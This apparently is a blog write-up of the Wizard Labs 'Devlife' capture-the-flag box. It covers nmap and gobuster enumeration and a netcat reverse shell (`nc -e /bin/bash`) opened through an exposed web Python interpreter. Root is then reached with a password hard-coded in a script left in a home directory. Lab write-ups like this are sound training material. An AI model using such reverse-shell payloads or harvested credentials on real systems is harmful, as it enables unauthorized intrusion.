---
layout: post
title: Wizard Labs - Devlife
categories: wizard-labs
tags: [Linux, Web, RCE, Python]
image: /wizardlabs/devlife/0.png
---
<hr>
### Quick Summary
#### Hey guys this is my write-up about Devlife from Wizard Labs which is their second box to retire. Just like [dummy](/wizard-labs/dummy/) it's another easy box (Difficulty : 2/10) , It's a linux box and its ip is `10.1.1.20` so let's jump right in !
![](/images/wizardlabs/devlife/0.png)
<hr>
### Nmap
#### We will start with nmap to scan for open ports and services : 
`nmap -sV -sT -sC 10.1.1.20`
![](/images/wizardlabs/devlife/1.png)
#### Only 2 ports are open , 22 running ssh and 80 running http. Let's check http.
<hr>
### HTTP Initial Enumeration
#### On the main page we get this "About me" message and nothing else :
![](/images/wizardlabs/devlife/2.png)
```
About Me

Hello , My name is Teddy Smith , I am a Python developer since 2007 !

Here I gonna share some Django tutorials and tutorials about System Administation in Python also I will write a Python online interpreter !!

Stay Tuned ...

TS

```
#### I ran `gobuster` with `/usr/share/wordlists/dirb/common.txt` and got these results :
```
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/.hta (Status: 403)
/dev (Status: 301)
/index.html (Status: 200)
/manual (Status: 301)
/server-status (Status: 403)
```
<br>
<hr>
### Getting user
#### So I checked `/dev` and found this `Online Python 2.7 Interpreter` :
![](/images/wizardlabs/devlife/3.png)
#### Great , now we can get a reverse shell in many ways , I just imported `os` then did `os.system(reverse shell payload)` :
`import os;os.system('nc -e /bin/bash 10.xx.xx.xx 1337')`
![](/images/wizardlabs/devlife/4.png)
<br>
<br>
![](/images/wizardlabs/devlife/5.png)
#### And we owned user !
<br>
<hr>
### Stored root Credentials , Privilege Escalation
#### In the `/home` directory of `tedd` there is a directory called `.env` , Let's check that.
![](/images/wizardlabs/devlife/6.png)
<br>
<br>
![](/images/wizardlabs/devlife/7.png)
#### We notice a python script called `su.py` , which runs `su root` and uses the password to authenticate :
![](/images/wizardlabs/devlife/8.png)
```
import pexpect
child = pexpect.spawn('su root')
child.expect ('Password:')
child.sendline('teddyxy2019')
child.expect('\$')
child.sendline('whoami')
```
#### Now we can `su` to root using the password `teddyxy2019` :
![](/images/wizardlabs/devlife/9.png)
#### And we owned root !
<br>
<br>
#### That's it , Feedback is appreciated !
#### Don't forget to read the [previous write-ups](/categories) , Tweet about the write-up if you liked it , follow on twitter for awesome resources [@Ahm3d_H3sham](https://twitter.com/Ahm3d_H3sham)
#### Thanks for reading.
#### Previous Wizard Labs Write-up : [Wizard Labs - Dummy](/wizard-labs/dummy/)
<hr>
